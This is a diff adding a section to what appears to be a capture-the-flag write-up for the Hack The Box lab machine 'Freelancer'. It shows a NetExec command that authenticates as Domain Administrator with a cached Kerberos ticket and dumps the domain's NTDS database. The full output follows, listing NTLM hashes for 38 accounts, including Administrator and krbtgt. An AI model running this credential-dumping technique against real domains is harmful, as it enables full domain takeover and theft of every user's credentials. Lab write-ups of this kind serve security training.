@@ -748,6 +748,56 @@ SMB         dc.freelancer.htb 445    DC               [+] FREELANCER\Administrat
 Now as seen here i can auth as the DA
 
 ```python
+faketime -f +5h nxc smb dc.freelancer.htb --use-kcache --ntds
+SMB         dc.freelancer.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc.freelancer.htb 445    DC               [+] FREELANCER\Administrator from ccache (Pwn3d!)
+SMB         dc.freelancer.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc.freelancer.htb 445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
+SMB         dc.freelancer.htb 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc.freelancer.htb 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
+SMB         dc.freelancer.htb 445    DC               sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
+SMB         dc.freelancer.htb 445    DC               SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
+SMB         dc.freelancer.htb 445    DC               sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+SMB         dc.freelancer.htb 445    DC               lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\sophia.h:1135:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\Ethan.l:1138:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\wwalker:1141:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\jgreen:1142:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\evelyn.adams:1143:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\hking:1144:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\alex.hill:1145:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\samuel.turner:1146:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\ereed:1149:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\leon.sk:1151:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\carol.poland:1160:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\lkazanof:1162:aad3b435b51404eeaad3b435b51404ee:a26c33c2878b23df8b2da3d10e430a0f:::
+SMB         dc.freelancer.htb 445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
+SMB         dc.freelancer.htb 445    DC               DATACENTER-2019$:1115:aad3b435b51404eeaad3b435b51404ee:7a8b0efef4571ec55cc0b9f8cb73fdcf:::
+SMB         dc.freelancer.htb 445    DC               DATAC2-2022$:1155:aad3b435b51404eeaad3b435b51404ee:007a710c0581c63104dad1e477c794e8:::
+SMB         dc.freelancer.htb 445    DC               WS1-WIIN10$:1156:aad3b435b51404eeaad3b435b51404ee:57e57c6a3f0f8fff74e8ab524871616b:::
+SMB         dc.freelancer.htb 445    DC               WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::
+SMB         dc.freelancer.htb 445    DC               WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::
+SMB         dc.freelancer.htb 445    DC               DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::
+SMB         dc.freelancer.htb 445    DC               SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::
+SMB         dc.freelancer.htb 445    DC               EVIL$:12101:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         dc.freelancer.htb 445    DC               [+] Dumped 38 NTDS hashes to /home/kali/.nxc/logs/ntds/DC_dc.freelancer.htb_2026-10-03_220357.ntds of which 29 were added to the database
+SMB         dc.freelancer.htb 445    DC               [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc.freelancer.htb 445    DC               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC_dc.freelancer.htb_2026-10-03_220357.ntds | cut -d ':' -f1
+```
+
+Then ill just dump the NTDS, this can also be done with impackets secretsdump
+
+```python
 
 ```
 
